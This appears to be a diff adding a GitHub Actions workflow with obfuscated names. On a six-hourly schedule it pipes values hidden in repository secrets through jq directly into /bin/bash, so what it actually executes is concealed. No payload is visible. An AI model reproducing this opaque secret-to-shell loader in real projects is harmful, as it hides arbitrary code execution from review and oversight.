@@ -1,0 +1,22 @@
+name: zhibinluai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhibinluai
+        env:
+          pz870: ${{ secrets.pz870 }}
+        run: |
+          echo $pz870 | jq -r .yo62472 | /bin/bash
+          echo $c359 | jq -r .qtubu84 | /bin/bash
+          echo $ueaf058 | jq -r .dwkb5789 | /bin/bash
+          echo $mg1 | jq -r .pxo1425 | /bin/bash
+          echo $pauac9175 | jq -r .h63 | /bin/bash
+          echo $a35432 | jq -r .bsucm8544 | /bin/bash
+          echo $u50323 | jq -r .bmvo6 | /bin/bash
+
